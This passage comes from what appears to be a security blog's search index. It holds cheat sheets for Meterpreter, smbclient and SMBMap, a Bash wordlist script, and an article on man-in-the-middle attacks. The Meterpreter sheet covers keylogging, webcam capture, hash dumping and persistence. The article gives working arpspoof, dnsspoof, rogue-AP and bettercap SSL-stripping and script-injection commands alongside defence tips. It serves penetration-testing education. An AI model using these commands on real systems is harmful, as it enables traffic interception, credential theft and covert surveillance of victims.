pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and 